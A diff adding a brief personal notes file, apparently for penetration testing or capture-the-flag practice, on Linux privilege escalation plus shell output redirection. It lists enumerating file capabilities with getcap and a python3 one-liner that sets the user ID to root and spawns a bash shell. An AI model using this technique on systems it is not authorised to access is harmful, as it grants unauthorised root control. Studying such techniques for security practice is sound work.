@@ -1,0 +1,14 @@
+
+1. file to run wihtout sudo, sudo no password requried
+2. getcap -r / 2>/dev/null  // gives filename and capabilities
+3. files, if extension 3.something, go for 2.something or more ...
+4. python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+
+> file redirects stdout to file
+1> file redirects stdout to file
+
+2> file redirects stderr to file
+
+&> file redirects stdout and stderr to file
+> file 2>&1 redirects stdout and stderr to file
